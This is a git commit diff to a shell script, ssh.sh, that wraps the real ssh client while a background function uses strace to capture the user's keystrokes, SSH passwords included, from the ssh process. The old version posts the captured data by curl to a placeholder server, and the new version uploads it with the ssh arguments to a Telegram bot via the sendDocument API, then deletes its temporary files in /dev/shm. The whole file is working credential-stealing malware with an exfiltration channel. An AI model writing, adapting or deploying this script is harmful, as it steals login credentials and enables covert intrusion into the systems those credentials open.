318e88bfad28dc7098fde9858813b8c491fee588
endremanml <enderman@rambler.ua>
2024-08-12 23:40:11 +0300

    update

--- ssh.sh
+++ ssh.sh
@@ -1,30 +1,28 @@
-#!/bin/bash
+#!/bin/bash -e
+#deps: strace curl perl
 ssh_params=$@
+set -e
+
+bot_id="<bot_id>"
+chat_id="<chat_id>"
+strace_log=/dev/shm/tgjb613w-ezsu0upg
+payload=/dev/shm/tgjb613w-1ztu1skg.txt
 
 get_ssh_pid() {
 	ps aux |
-	egrep "/usr/bin/ssh\s$ssh_params" |
+	egrep "/usr/bin/ssh\s${ssh_params}" |
 	grep -v grep |
 	awk {'print $2'}
 } 
 
 capt() {
-	ssh_pid=$(get_ssh_pid)
-	raw_data=$(strace -f -p $ssh_pid -e trace=read 2>&1)
-	data=$(
-		echo -n $raw_data |
-		perl -ne'print "$1" while /read\(4,\s"(.{1,6})",/g' |
-		sed -E 's/\\n|\\r/\n/g' |
-		base64 -w0
-	)
-
-	if [ -n "$data" ]; then
-	  curl -X POST -s -d "$(echo -n $ssh_params | base64 -w0)" -d "$data" http://[your server] &> /dev/null
-	fi	
+	echo $ssh_params >>$payload
+	strace -f -p $(get_ssh_pid) -e trace=read >>$strace_log 2>&1
+	if [ -s "$strace_log" ]; then
+	  cat $strace_log | perl -ne'print "$1" while /read\(4,\s"(.{1,6})",/g' | sed -E 's/\\n|\\r/\n/g' >>$payload 2>/dev/null
+	  curl -sF document=@${payload} https://api.telegram.org/bot${bot_id}/sendDocument?chat_id=${chat_id} &>/dev/null
+	fi
+	rm -f $strace_log $payload &>/dev/null
 }
 capt &
 /usr/bin/ssh $ssh_params
-
-
- 
-
